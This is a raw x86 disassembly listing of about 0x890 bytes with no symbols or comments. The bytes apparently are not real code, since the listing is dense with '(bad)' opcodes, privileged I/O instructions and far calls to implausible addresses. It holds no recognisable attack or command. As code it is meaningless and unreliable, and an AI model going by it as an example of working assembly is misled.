  420aa2:	cmp    DWORD PTR ds:0x9eaa1358,ecx
  420aa8:	jae    0x420a48
  420aaa:	push   ebx
  420aab:	adc    ch,BYTE PTR ds:0x6fe6fe38
  420ab1:	retf   0x792f
  420ab4:	imul   eax,ebx,0x6e
  420ab7:	leave  
  420ab8:	call   0x6e73:0x39f4cf0a
  420abf:	pop    ss
  420ac0:	xchg   ecx,eax
  420ac1:	jnp    0x420a69
  420ac3:	xor    eax,0x73415275
  420ac8:	es int 0xa4
  420acb:	and    DWORD PTR [ecx],ecx
  420acd:	mov    eax,0x126559d1
  420ad2:	das    
  420ad3:	sbb    DWORD PTR [ebp+ecx*4+0x47],esp
  420ad7:	adc    BYTE PTR [eax+ebp*8],bh
  420ada:	fisubr DWORD PTR ds:0x34c242c4
  420ae0:	int3   
  420ae1:	jecxz  0x420ade
  420ae3:	leave  
  420ae4:	push   cs
  420ae5:	rcr    dh,cl
  420ae7:	mov    BYTE PTR [esi+0x1bef4ca0],cl
  420aed:	jbe    0x420b63
  420aef:	xchg   DWORD PTR [esi],eax
  420af1:	and    edx,DWORD PTR [eax-0x3b9053a7]
  420af7:	xor    BYTE PTR [ebp+0x1ad900f2],cl
  420afd:	xor    al,0xe8
  420aff:	out    0x67,eax
  420b01:	mov    al,0x1f
  420b03:	dec    eax
  420b04:	push   ebx
  420b05:	cwde   
  420b06:	adc    eax,0x333b299a
  420b0b:	push   esp
  420b0c:	inc    edx
  420b0d:	jnp    0x420ab4
  420b0f:	add    DWORD PTR [ebp-0x55],eax
  420b12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b13:	dec    esp
  420b14:	push   eax
  420b15:	sub    esp,DWORD PTR [ebx-0x21]
  420b18:	fdivrp st(0),st
  420b1a:	xor    al,0x87
  420b1c:	adc    edi,ecx
  420b1e:	mov    ds:0x9c6c4b87,al
  420b23:	loopne 0x420b40
  420b25:	imul   ebp,edi,0xb9f1e73c
  420b2b:	call   0x54e2e2b1
  420b30:	addr16 add ebx,edi
  420b33:	(bad)  
  420b34:	xor    al,0x59
  420b36:	and    bh,BYTE PTR [edi+0x9297d09]
  420b3c:	jp     0x420b90
  420b3e:	sub    bh,BYTE PTR [esi+0x46]
  420b41:	ret    0xcd45
  420b44:	test   al,0xab
  420b46:	repnz dec eax
  420b48:	push   ebp
  420b49:	jb     0x420ae1
  420b4b:	ret    0x6a99
  420b4e:	mov    eax,ds:0x4c9027c8
  420b53:	neg    DWORD PTR es:[esi]
  420b56:	cmp    ebp,DWORD PTR [esi]
  420b58:	mov    al,0x77
  420b5a:	mov    bl,0x2e
  420b5c:	ret    0x74ba
  420b5f:	sub    eax,0x89ad8b92
  420b64:	stos   DWORD PTR es:[edi],eax
  420b65:	cs in  al,0xcf
  420b68:	push   ebp
  420b69:	inc    ebx
  420b6a:	je     0x420bcf
  420b6c:	push   cs
  420b6d:	hlt    
  420b6e:	rcl    BYTE PTR [ebp-0x42],cl
  420b71:	pop    esi
  420b72:	and    edx,DWORD PTR [esi+ebp*2-0x3b247535]
  420b79:	stos   DWORD PTR es:[edi],eax
  420b7a:	dec    BYTE PTR [eax]
  420b7c:	cs push ss
  420b7e:	(bad)  
  420b7f:	mov    bl,0x8e
  420b81:	loope  0x420b7e
  420b83:	int3   
  420b84:	mov    esp,0x63b596ea
  420b89:	fst    QWORD PTR [ecx]
  420b8c:	jns    0x420b88
  420b8e:	push   esi
  420b8f:	push   cs
  420b90:	out    0xa5,eax
  420b92:	or     edx,DWORD PTR [ebp+0x482942a9]
  420b98:	mov    dl,0x13
  420b9a:	lods   al,BYTE PTR ds:[esi]
  420b9b:	leave  
  420b9c:	inc    eax
  420b9d:	fidivr DWORD PTR [eax+0x6d3c68a]
  420ba3:	or     bl,BYTE PTR [edx]
  420ba5:	jmp    0x420c00
  420ba7:	xor    edi,edx
  420ba9:	or     eax,0xf0b789ef
  420bae:	clc    
  420baf:	fisttp QWORD PTR [ecx+0x1db6cbd0]
  420bb5:	sub    eax,0xfa08e2d
  420bba:	test   BYTE PTR [edi+0x15],ah
  420bbd:	or     ecx,esp
  420bbf:	adc    BYTE PTR [edi-0x63],dl
  420bc2:	push   es
  420bc3:	icebp  
  420bc4:	es ret 0x39c4
  420bc8:	inc    esp
  420bc9:	dec    ebx
  420bca:	lds    esi,FWORD PTR [ebx+edx*1+0x1d82443e]
  420bd1:	xchg   ch,al
  420bd3:	dec    edx
  420bd4:	jne    0x420c55
  420bd6:	mov    gs,WORD PTR [edi*8+0x65d0762e]
  420bdd:	xlat   BYTE PTR ds:[ebx]
  420bde:	je     0x420c56
  420be0:	cdq    
  420be1:	sub    DWORD PTR [ecx],edi
  420be3:	imul   ecx,DWORD PTR [edx+edi*8-0x427ae18a],0x6e
  420beb:	popa   
  420bec:	rcl    DWORD PTR [ecx],cl
  420bee:	adc    eax,0xc56be703
  420bf3:	pop    esi
  420bf4:	xor    edx,DWORD PTR [ebx]
  420bf6:	pop    ecx
  420bf7:	out    dx,al
  420bf8:	mov    ah,0x90
  420bfa:	arpl   WORD PTR [ebp+eax*4+0x79],bp
  420bfe:	add    DWORD PTR [edx],ecx
  420c00:	shl    BYTE PTR [ebx],0x5d
  420c03:	xchg   ebx,eax
  420c04:	or     ebp,ebp
  420c06:	dec    ebx
  420c07:	adc    eax,0x91af503a
  420c0c:	pop    DWORD PTR ds:0x1618fd36
  420c12:	xchg   esp,eax
  420c13:	jge    0x420c29
  420c15:	cmp    al,0xff
  420c17:	sbb    BYTE PTR [eax-0x1cf66106],bh
  420c1d:	hlt    
  420c1e:	icebp  
  420c1f:	xchg   esi,esp
  420c21:	sbb    al,0x29
  420c23:	outs   dx,BYTE PTR ds:[esi]
  420c24:	inc    ebp
  420c25:	adc    eax,0xb37f3395
  420c2a:	dec    ebx
  420c2b:	outs   dx,DWORD PTR ds:[esi]
  420c2c:	retf   0xe160
  420c2f:	xor    esp,DWORD PTR [edi+eax*2-0x21193f74]
  420c36:	jb     0x420c80
  420c38:	cmp    eax,0x529c463a
  420c3d:	adc    eax,0xdf4836aa
  420c42:	pop    esi
  420c43:	loopne 0x420bfe
  420c45:	mov    cl,ah
  420c47:	pop    ss
  420c48:	pushf  
  420c49:	inc    edi
  420c4a:	push   ds
  420c4b:	mov    edx,DWORD PTR [edx-0x11]
  420c4e:	fstp   TBYTE PTR [esi+0x4e]
  420c51:	sbb    al,0x9f
  420c53:	rcl    BYTE PTR [ecx+0x70],cl
  420c56:	push   ss
  420c57:	scas   eax,DWORD PTR es:[edi]
  420c58:	lock iret 
  420c5a:	mov    bh,0x17
  420c5c:	adc    bl,BYTE PTR ds:0xf937ce04
  420c62:	neg    BYTE PTR [ebp-0xa768fba]
  420c68:	mov    ?,ebx
  420c6a:	jne    0x420cd8
  420c6c:	fcom   st(3)
  420c6e:	cmc    
  420c6f:	ins    DWORD PTR es:[edi],dx
  420c70:	sub    DWORD PTR [edx-0x5d],0x9e846719
  420c77:	popf   
  420c78:	sbb    DWORD PTR [edi],esi
  420c7a:	xchg   esi,eax
  420c7b:	test   DWORD PTR es:[ecx+0x3934a1a8],esi
  420c82:	test   BYTE PTR [ebp+edi*2+0x47988915],cl
  420c89:	push   0x4e
  420c8b:	pop    eax
  420c8c:	out    dx,eax
  420c8d:	ret    0xf39d
  420c90:	lahf   
  420c91:	shr    BYTE PTR [edi],cl
  420c93:	push   0x6d
	...
  420d14:	jecxz  0x420d1c
  420d16:	add    DWORD PTR [edi-0x1b],esi
  420d19:	ja     0x420d12
  420d1b:	xchg   esi,eax
  420d1c:	popf   
  420d1d:	mov    edx,0xcfacc648
  420d22:	lods   eax,DWORD PTR ds:[esi]
  420d23:	xchg   edx,eax
  420d24:	les    esp,FWORD PTR [ecx+eax*1+0x76900]
  420d2b:	add    BYTE PTR [ebx],ch
  420d2d:	sub    eax,0xe817167e
  420d32:	push   edx
  420d33:	(bad)  
  420d34:	mov    ebp,0xd52bf77f
  420d39:	jnp    0x420d6f
  420d3b:	out    0xe7,eax
  420d3d:	xor    DWORD PTR [ebp-0x6f],0x40f2799b
  420d44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d45:	mov    ebp,0xe71a4d26
  420d4a:	pop    edx
  420d4b:	mov    eax,0xe349f1c0
  420d50:	pop    esi
  420d51:	xor    ebp,0xb8b8b48d
  420d57:	lds    ebx,FWORD PTR [ebp+0x11]
  420d5a:	mov    ds:0x4aed262,eax
  420d5f:	cmp    al,0xb0
  420d61:	repz sahf 
  420d63:	rcl    DWORD PTR [edi],0xb8
  420d66:	jo     0x420da5
  420d68:	int3   
  420d69:	in     al,dx
  420d6a:	rcl    esp,0x21
  420d6d:	adc    eax,0xe84906bc
  420d72:	sub    ebx,esp
  420d74:	pop    ds
  420d75:	and    BYTE PTR [eax],0x63
  420d78:	sar    BYTE PTR [esi-0x7c241635],cl
  420d7e:	and    al,0x4e
  420d80:	add    al,0x6c
  420d82:	jno    0x420d5d
  420d84:	mov    edx,0xdc52f75e
  420d89:	pop    DWORD PTR [edx-0x59]
  420d8c:	in     eax,0x65
  420d8e:	loopne 0x420d1a
  420d90:	aaa    
  420d91:	fild   WORD PTR [edx]
  420d93:	xor    al,0xd8
  420d95:	dec    esp
  420d96:	add    eax,DWORD PTR [edi-0x4fe3bbb7]
  420d9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d9d:	outs   dx,DWORD PTR ds:[esi]
  420d9e:	mov    ebp,0x55035ccd
  420da3:	jns    0x420d8c
  420da5:	xchg   esi,eax
  420da6:	shl    BYTE PTR [edx+esi*1+0x400ccf61],1
  420dad:	xchg   edi,ecx
  420daf:	outs   dx,BYTE PTR ds:[esi]
  420db0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420db1:	(bad)
  420db5:	fisub  DWORD PTR [ecx]
  420db7:	repz pop esi
  420db9:	clc    
  420dba:	pushf  
  420dbb:	cmp    edi,DWORD PTR [edi-0x2b8713ec]
  420dc1:	adc    dl,BYTE PTR [esi]
  420dc3:	inc    edx
  420dc4:	ins    DWORD PTR es:[edi],dx
  420dc5:	ret    
  420dc6:	retf   
  420dc7:	mov    ds:0x85d531f7,al
  420dcc:	add    ah,BYTE PTR [ecx]
  420dce:	gs nop
  420dd0:	lea    esi,[edi+edx*1+0x1a]
  420dd4:	jne    0x420e44
  420dd6:	(bad)  
  420dd7:	enter  0xf9d5,0xc
  420ddb:	or     BYTE PTR [ebx],cl
  420ddd:	popf   
  420dde:	sti    
  420ddf:	sbb    al,0xcd
  420de1:	(bad)  
  420de2:	push   ds
  420de3:	imul   edi,DWORD PTR [eax+0x34],0xffffff96
  420de7:	lock push es
  420de9:	and    edi,DWORD PTR [ebp-0x48]
  420dec:	leave  
  420ded:	push   ecx
  420dee:	clc    
  420def:	xchg   esi,eax
  420df0:	sbb    bh,BYTE PTR [ebx]
  420df2:	jge    0x420e49
  420df4:	cwde   
  420df5:	cmp    al,0x21
  420df7:	dec    ebp
  420df8:	jns    0x420dce
  420dfa:	push   ebp
  420dfb:	in     eax,0xe0
  420dfd:	mov    eax,ds:0x82b172dd
  420e02:	mov    bh,0xf0
  420e04:	adc    al,0x1b
  420e06:	popf   
  420e07:	dec    ebp
  420e08:	loopne 0x420de2
  420e0a:	dec    esi
  420e0b:	xchg   esp,eax
  420e0c:	sbb    dl,BYTE PTR [ecx*2-0x29c502cd]
  420e13:	adc    dh,BYTE PTR [ebp-0x17eba455]
  420e19:	aam    0xaf
  420e1b:	add    al,0xa
  420e1d:	push   eax
  420e1e:	cdq    
  420e1f:	in     eax,0x30
  420e21:	mov    bh,0x67
  420e23:	or     ch,BYTE PTR [edi-0x23]
  420e26:	add    bh,BYTE PTR [edx-0x33]
  420e29:	popf   
  420e2a:	aam    0xb7
  420e2c:	xchg   ebx,eax
  420e2d:	in     eax,dx
  420e2e:	jb     0x420e94
  420e30:	sub    DWORD PTR [edi+0x6fff4e7e],ebp
  420e36:	or     al,0x5e
  420e38:	shr    BYTE PTR [ecx+ebx*2-0x6],cl
  420e3c:	mov    eax,ds:0x8d15aae9
  420e41:	push   edx
  420e42:	fnstenv [esi+0x427c077]
  420e48:	sub    al,0x84
  420e4a:	jae    0x420e73
  420e4c:	aad    0x83
  420e4e:	je     0x420e76
  420e50:	add    BYTE PTR [edx-0x7e],0x78
  420e54:	lea    esi,[ecx]
  420e56:	loope  0x420e23
  420e58:	pop    esi
  420e59:	outs   dx,BYTE PTR ds:[esi]
  420e5a:	sub    eax,0x3182bbc
  420e5f:	jne    0x420e13
  420e61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420e62:	repnz fs stos DWORD PTR es:[edi],eax
  420e65:	dec    edx
  420e66:	fsub   QWORD PTR [edx-0x6c9e1265]
  420e6c:	leave  
  420e6d:	jno    0x420e31
  420e6f:	dec    ebp
  420e70:	test   DWORD PTR ds:0xe333,edx
  420e75:	push   esp
  420e76:	dec    esi
  420e77:	or     dh,BYTE PTR [edi-0x7e]
  420e7a:	push   0x2f09f2fd
  420e7f:	push   ss
  420e80:	push   es
  420e81:	sbb    eax,0x903ed20c
  420e86:	imul   eax,ebx,0x44
  420e89:	push   edx
  420e8a:	or     DWORD PTR [edx-0x4451096a],ebx
  420e90:	pop    es
  420e91:	add    DWORD PTR [eax+0x22be4550],esp
  420e97:	mov    ds:0x851b47f5,eax
  420e9c:	hlt    
  420e9d:	bound  ebx,QWORD PTR [edx+0x7d360099]
  420ea3:	add    ebp,DWORD PTR [eax+0x721f2686]
  420ea9:	lea    eax,[ebp-0x38]
  420eac:	call   0x140d:0xcfb75387
  420eb3:	dec    ebp
  420eb4:	mov    ah,dl
  420eb6:	push   eax
  420eb7:	ja     0x420eba
  420eb9:	push   0xffffff9a
  420ebb:	and    eax,0x311cdf7c
  420ec0:	mov    DWORD PTR [edx+0x27],esp
  420ec3:	inc    edi
  420ec4:	loop   0x420e6c
  420ec6:	jns    0x420ecd
  420ec8:	cwde   
  420ec9:	loopne 0x420e8a
  420ecb:	mov    ebp,0xa06365d2
  420ed0:	lds    esp,FWORD PTR [ebp+0x45]
  420ed3:	out    dx,eax
  420ed4:	lea    edi,[ecx+0x3]
  420ed7:	jmp    0xf51b49a9
  420edc:	jbe    0x420f45
  420ede:	lds    edx,FWORD PTR [esi+0x4f]
  420ee1:	sbb    DWORD PTR [eax+0x18],edx
  420ee4:	xlat   BYTE PTR ds:[ebx]
  420ee5:	mov    edi,DWORD PTR [ebx-0x3a3ce088]
  420eeb:	mov    ebp,0x61138f7
  420ef0:	iret   
  420ef1:	or     al,0x33
  420ef3:	xchg   BYTE PTR [ebx-0x120b29e4],dh
  420ef9:	add    esp,edi
  420efb:	lods   eax,DWORD PTR ds:[esi]
  420efc:	and    BYTE PTR [eax],bl
  420efe:	pop    edi
  420eff:	push   cs
  420f00:	xchg   ebx,eax
  420f01:	and    DWORD PTR [ecx+0x605224b7],0x421b4de2
  420f0b:	enter  0x86c,0x3d
  420f0f:	test   DWORD PTR [edx+ebp*4-0x4d],esi
  420f13:	xchg   ebx,eax
  420f14:	fwait
  420f15:	inc    esi
  420f16:	mov    eax,0xe851a04e
  420f1b:	and    al,0xaa
  420f1d:	ja     0x420f72
  420f1f:	popf   
  420f20:	int    0x62
  420f22:	mov    edx,0xf4287512
  420f27:	les    ebx,FWORD PTR [ebx-0x7f5c0d5a]
  420f2d:	pop    ds
  420f2e:	stos   DWORD PTR es:[edi],eax
  420f2f:	nop
  420f30:	test   al,0xb1
  420f32:	pop    eax
  420f33:	mov    bl,0x35
  420f35:	stos   DWORD PTR es:[edi],eax
  420f36:	and    BYTE PTR [edx],cl
  420f38:	(bad)  
  420f39:	test   eax,0x1312e5d6
  420f3e:	out    0xc0,al
  420f40:	mov    ch,0xcf
  420f42:	or     cl,BYTE PTR [eax-0x63]
  420f45:	sti    
  420f46:	or     BYTE PTR [ebp-0x3dfe8957],al
  420f4c:	inc    ebp
  420f4d:	(bad)  
  420f4e:	mov    ebx,0x94f83632
  420f53:	cmp    BYTE PTR ds:0xcef162ae,dh
  420f59:	sti    
  420f5a:	push   cs
  420f5b:	jg     0x420f72
  420f5d:	xchg   ebx,eax
  420f5e:	sub    DWORD PTR [esi],ecx
  420f60:	repz popa 
  420f62:	call   0xa98cf5e7
  420f67:	xchg   edx,eax
  420f68:	mov    ds:0x72e27f3f,eax
  420f6d:	adc    DWORD PTR [ebp+0x658db43],ecx
  420f73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420f74:	push   ss
  420f75:	push   esp
  420f76:	cmp    al,0x52
  420f78:	(bad)
  420f7d:	jnp    0x420fb0
  420f7f:	push   ecx
  420f80:	pushf  
  420f81:	cmp    al,0x72
  420f83:	cdq    
  420f84:	enter  0xc8b5,0x4c
  420f88:	adc    edx,esi
  420f8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420f8b:	mov    dh,0xb8
  420f8d:	imul   ecx,esi,0x2e2efac0
  420f93:	(bad)  
  420f94:	in     eax,0x56
  420f96:	dec    ebx
  420f97:	jecxz  0x420fb0
  420f99:	std    
  420f9a:	hlt    
  420f9b:	mov    dl,dl
  420f9d:	arpl   WORD PTR [edx-0x36b34005],di
  420fa3:	hlt    
  420fa4:	js     0x420f7c
  420fa6:	push   ss
  420fa7:	shl    DWORD PTR [ecx+ecx*4-0x35],cl
  420fab:	cdq    
  420fac:	jno    0x420f87
  420fae:	add    bl,0x73
  420fb1:	test   eax,0x9c9d0ece
  420fb6:	xor    dh,BYTE PTR [esi]
  420fb8:	push   ecx
  420fb9:	jl     0x420fc1
  420fbb:	mov    esi,0x4141e54d
  420fc0:	daa    
  420fc1:	shl    DWORD PTR es:[eax],1
  420fc4:	fiadd  WORD PTR [ebx-0x4105c4cd]
  420fca:	and    BYTE PTR [ebx],cl
  420fcc:	jl     0x420fef
  420fce:	sub    DWORD PTR [esp+edi*8-0x35328977],edx
  420fd5:	adc    eax,0x48493296
  420fda:	xor    ebx,eax
  420fdc:	sbb    BYTE PTR [ebx-0x56],bl
  420fdf:	rcl    BYTE PTR [esi],0x71
  420fe2:	push   0xe0628402
  420fe7:	push   cs
  420fe8:	mov    ebx,0xd8d3ff15
  420fed:	out    dx,eax
  420fee:	mov    ds:0xc1fe75bf,eax
  420ff3:	test   BYTE PTR [ebp+0x2a3e1000],0xe
  420ffa:	test   BYTE PTR [esi+eax*2],dh
  420ffd:	dec    ebx
  420ffe:	push   edx
  420fff:	pop    esp
  421000:	cli    
  421001:	scas   eax,DWORD PTR es:[edi]
  421002:	retf   0xac03
  421005:	cmp    DWORD PTR [edx-0x4b],ecx
  421008:	dec    ebp
  421009:	dec    esi
  42100a:	lds    ecx,FWORD PTR [eax]
  42100c:	loopne 0x420f96
  42100e:	add    eax,0x8271cad2
  421013:	inc    esi
  421014:	mov    ds:0xb140a636,eax
  421019:	pop    esp
  42101a:	push   esp
  42101b:	xchg   ebp,eax
  42101c:	(bad)  
  42101d:	fnsave [ebp+0x7a]
  421020:	pop    edx
  421021:	mov    edi,0xfe03eaa6
  421026:	jmp    0x42101d
  421028:	or     eax,0x4c061e11
  42102d:	pop    ebp
  42102e:	call   0xd3f3:0xeb231973
  421035:	adc    ebp,edi
  421037:	js     0x420fc6
  421039:	add    BYTE PTR [esi-0x5a],ah
  42103c:	movmskps esp,xmm1
  42103f:	outs   dx,DWORD PTR ds:[esi]
  421040:	mov    bh,BYTE PTR [ebx]
  421042:	cmp    cl,ch
  421044:	clc    
  421045:	sub    bh,BYTE PTR [ebp+edi*8-0x6a]
  421049:	mov    bh,0x3e
  42104b:	and    BYTE PTR [eax],dl
  42104d:	jmp    0x66aa4914
  421052:	jle    0x421025
  421054:	shl    eax,cl
  421056:	sbb    esp,DWORD PTR [edi+0x43]
  421059:	pop    edx
  42105a:	cld    
  42105b:	scas   eax,DWORD PTR es:[edi]
  42105c:	clc    
  42105d:	mov    eax,ds:0x64ae0631
  421062:	lods   eax,DWORD PTR ds:[esi]
  421063:	cmp    esi,DWORD PTR [esi+eiz*2]
  421066:	mov    ch,0x80
  421068:	dec    BYTE PTR [edi+0x59]
  42106b:	push   esp
  42106c:	stc    
  42106d:	jg     0x421097
  42106f:	ret    0xd4de
  421072:	cmp    bl,BYTE PTR [ebx+edi*1+0x41]
  421076:	test   eax,0xf624eda9
  42107b:	imul   eax,DWORD PTR [ecx+0x79bdc7d6],0xffffffa0
  421082:	dec    esi
  421083:	sub    al,dl
  421085:	dec    ebx
  421086:	in     eax,0x0
  421088:	adc    eax,0x6eb9da9a
  42108d:	xchg   BYTE PTR [edi-0x4f965079],dl
  421093:	daa    
  421094:	lds    esp,FWORD PTR [esi]
  421096:	sub    BYTE PTR [esi-0x3822a6f2],al
  42109c:	add    eax,0xaab3a460
  4210a1:	mov    ds:0x1dc11e06,eax
  4210a6:	out    dx,eax
  4210a7:	and    edx,DWORD PTR [ebx+0x41eb8a89]
  4210ad:	xchg   DWORD PTR [edx-0x5ca8f9b3],ecx
  4210b3:	pop    eax
  4210b4:	cmp    BYTE PTR [esi+0x4acdb46c],bh
  4210ba:	addr16 inc esi
  4210bc:	out    dx,eax
  4210bd:	loop   0x4210a6
  4210bf:	(bad)  
  4210c0:	(bad)
  4210c3:	call   0x8d9efa58
  4210c8:	fstp   TBYTE PTR ds:0x84bc4a17
  4210ce:	outs   dx,DWORD PTR ds:[esi]
  4210cf:	pop    ebx
  4210d0:	pushf  
  4210d1:	je     0x4210cf
  4210d3:	adc    eax,0x36f90b6a
  4210d8:	mov    cl,0x57
  4210da:	push   ss
  4210db:	push   esi
  4210dc:	dec    edx
  4210dd:	inc    ecx
  4210de:	es adc ch,dl
  4210e1:	cmp    bl,ch
  4210e3:	iret   
  4210e4:	mov    ebx,0x37486617
  4210e9:	pop    esi
  4210ea:	sub    al,0x5f
  4210ec:	loop   0x42114b
  4210ee:	lea    ebp,[ebp-0x373fb975]
  4210f4:	aad    0xfc
  4210f6:	xor    BYTE PTR [ecx+0x544a8f26],dh
  4210fc:	xor    dl,BYTE PTR [ecx+0x21a70be4]
  421102:	mov    al,0xa0
  421104:	push   edi
  421105:	out    0x95,eax
  421107:	add    eax,0xe0cec7e2
  42110c:	idiv   BYTE PTR [edi]
  42110e:	bound  esp,QWORD PTR [ebx+eax*8-0x49f97c30]
  421115:	mov    bh,0xb9
  421117:	cwde   
  421118:	mov    eax,ds:0xc682749a
  42111d:	xchg   edx,eax
  42111e:	add    ecx,ebx
  421120:	outs   dx,DWORD PTR ds:[esi]
  421121:	mov    edx,0x189401ed
  421126:	inc    ebx
  421127:	mov    DWORD PTR [esi-0x66],esp
  42112a:	add    ebx,DWORD PTR [esi+0x4e4700ee]
  421130:	imul   al
  421132:	xchg   esi,eax
  421133:	adc    al,0x19
  421135:	loope  0x42118d
  421137:	mov    dh,0xb6
  421139:	xchg   ebx,eax
  42113a:	call   0x78ee:0xf3941195
  421141:	and    dl,ah
  421143:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421144:	aad    0xde
  421146:	dec    edx
  421147:	jb     0x421177
  421149:	xor    edi,edx
  42114b:	test   DWORD PTR [edi*1+0x6c04689c],esp
  421152:	sbb    ecx,esi
  421154:	fcmovb st,st(7)
  421156:	sahf   
  421157:	and    al,BYTE PTR ds:0x9ee3d08c
  42115d:	or     esi,DWORD PTR [edi]
  42115f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421160:	add    eax,0x7c08bfc7
  421165:	loop   0x42111f
  421167:	inc    ecx
  421168:	push   0x264b7248
  42116d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42116e:	adc    ebx,DWORD PTR ds:0x8a365dc3
  421174:	dec    esi
  421175:	aaa    
  421176:	mov    edx,0x77881e53
  42117b:	and    esi,ecx
  42117d:	push   edi
  42117e:	adc    cl,BYTE PTR [ecx]
  421180:	dec    ebp
  421181:	push   0x25c704c7
  421186:	fmul   QWORD PTR [edi-0x45]
  421189:	stos   DWORD PTR es:[edi],eax
  42118a:	adc    BYTE PTR [esi-0x59c05b15],bl
  421190:	pop    edi
  421191:	mov    edx,edi
  421193:	mov    ecx,0x6c00de87
  421198:	pop    ebp
  421199:	xor    ebx,esp
  42119b:	jbe    0x4211dc
  42119d:	in     al,0x46
  42119f:	ror    DWORD PTR [edx-0xd929111],1
  4211a5:	aad    0x51
  4211a7:	imul   esp,DWORD PTR [edi+0x34712a6],0x806c7641
  4211b1:	clc    
  4211b2:	sub    bl,0xba
  4211b5:	scas   eax,DWORD PTR es:[edi]
  4211b6:	retf   0xffa1
  4211b9:	cmp    DWORD PTR [edi-0x49],ecx
  4211bc:	scas   eax,DWORD PTR es:[edi]
  4211bd:	mov    edx,0xe0974a1e
  4211c2:	push   ds
  4211c3:	push   ecx
  4211c4:	(bad)  
  4211c5:	sbb    ch,BYTE PTR [eax-0x5]
  4211c8:	fucomi st,st(7)
  4211ca:	lds    ecx,FWORD PTR [edi-0x61]
  4211cd:	xor    ch,bl
  4211cf:	mov    ecx,0x618a75c0
  4211d4:	jecxz  0x421186
  4211d6:	pushf  
  4211d7:	dec    esi
  4211d8:	fs xchg edi,eax
  4211da:	call   0x9277:0x9f9e821c
  4211e1:	inc    ebx
  4211e2:	inc    eax
  4211e3:	test   DWORD PTR [ebp+0x43be9e61],0x5072c2ce
  4211ed:	popf   
  4211ee:	or     eax,0x4e989830
  4211f3:	jle    0x421194
  4211f5:	jmp    0x113c:0xdcf32462
  4211fc:	clc    
  4211fd:	push   ebx
  4211fe:	stc    
  4211ff:	ja     0x421266
  421201:	dec    ecx
  421202:	out    0x6d,al
  421204:	aam    0xe0
  421206:	add    ebp,esp
  421208:	push   0x28
  42120a:	mul    BYTE PTR [ebx-0x28]
  42120d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42120e:	or     eax,0xf96802ca
  421213:	std    
  421214:	aaa    
  421215:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421216:	call   0xfaff7884
  42121b:	(bad)  
  42121c:	mov    ecx,0x7e9dcbe1
  421221:	ins    DWORD PTR es:[edi],dx
  421222:	call   0x11a:0x3dd4791b
  421229:	arpl   WORD PTR [esi+ecx*1],di
  42122c:	loope  0x421223
  42122e:	stc    
  42122f:	inc    esi
  421230:	xor    DWORD PTR [ebx-0x57],ebp
  421233:	cld    
  421234:	or     BYTE PTR [edi+0x50745b7b],0x40
  42123b:	jmp    0x421230
  42123d:	dec    esp
  42123e:	xor    cl,al
  421240:	push   ss
  421241:	out    0x8,eax
  421243:	ins    BYTE PTR es:[edi],dx
  421244:	xor    ebx,ebp
  421246:	or     DWORD PTR [ebp*2-0xa6bd0ac],edx
  42124d:	fisub  DWORD PTR [edx]
  42124f:	sub    dh,BYTE PTR [ebx+0x3b1a96d6]
  421255:	mov    dh,0xb3
  421257:	and    eax,0x8d96fc44
  42125c:	jp     0x42122c
  42125e:	adc    bl,0x19
  421261:	add    BYTE PTR [ebx-0x5bb7b55d],0x9b
  421268:	test   eax,0x3a84aaa3
  42126e:	sbb    eax,0x63f5be52
  421273:	adc    DWORD PTR [ebp-0x51],esi
  421276:	not    BYTE PTR ds:0x920aeba0
  42127c:	sub    DWORD PTR [eax-0x2c740b17],edi
  421282:	mov    eax,0xcfc4b41a
  421287:	cli    
  421288:	xor    DWORD PTR [eax-0x51],esi
  42128b:	pop    eax
  42128c:	test   BYTE PTR [esi],ah
  42128e:	mov    edx,0x30e858e6
  421293:	pushf  
  421294:	popf   
  421295:	sbb    ch,BYTE PTR [esi-0x28acbe05]
  42129b:	mov    eax,0x9fc735b0
  4212a0:	cmp    DWORD PTR [edx],ebx
  4212a2:	dec    ecx
  4212a3:	xor    eax,0x9b49b27c
  4212a8:	jle    0x4212de
  4212aa:	mov    ebx,0x3a9ada07
  4212af:	ret    
  4212b0:	xchg   esp,eax
  4212b1:	add    BYTE PTR [eax-0x1b55c0e4],cl
  4212b7:	sbb    edi,edi
  4212b9:	xchg   edi,eax
  4212ba:	sbb    ecx,DWORD PTR [ebx-0x65]
  4212bd:	das    
  4212be:	pusha  
  4212bf:	add    dl,BYTE PTR [edi+0x5b]
  4212c2:	pop    esp
  4212c3:	pusha  
  4212c4:	mov    ds:0xdf08a874,al
  4212c9:	jmp    0x5044:0x53c2ad21
  4212d0:	imul   esp,DWORD PTR [ebp+esi*2+0x2f],0xb9b3e634
  4212d8:	pop    edi
  4212d9:	sub    BYTE PTR [ecx+0x5781572d],bl
  4212df:	sbb    bh,BYTE PTR [eax-0x7e]
  4212e2:	mov    ebx,0x4155f752
  4212e7:	dec    esi
  4212e8:	lea    ebx,[edx+0x30118096]
  4212ee:	pop    ebp
  4212ef:	lods   eax,DWORD PTR ds:[esi]
  4212f0:	popf   
  4212f1:	lods   ax,WORD PTR ds:[esi]
  4212f3:	mov    edx,0x46916ecf
  4212f8:	pop    esi
  4212f9:	cmp    eax,0x25d35b00
  4212fe:	mov    ch,dh
  421300:	inc    eax
  421301:	mov    al,ds:0xccf84661
  421306:	pop    ds
  421307:	ret    
  421308:	fstp   QWORD PTR [edi-0x2ec91341]
  42130e:	ins    DWORD PTR es:[edi],dx
  42130f:	pop    eax
  421310:	test   DWORD PTR [ecx],esi
  421312:	sub    al,0x9c
  421314:	sub    ch,BYTE PTR [ecx-0x7e]
  421317:	dec    edx
  421318:	mov    dh,0x53
  42131a:	fisubr WORD PTR [ebx-0x60f47742]
  421320:	sbb    esi,edi
  421322:	gs cmc 
  421324:	(bad)  
  421325:	fwait
  421326:	jnp    0x4212b0
  421328:	sbb    eax,0xc5576672
  42132d:	xor    ebx,ecx
  42132f:	add    al,0x9a
  421331:	fdivr  st,st(4)
  421333:	int3   
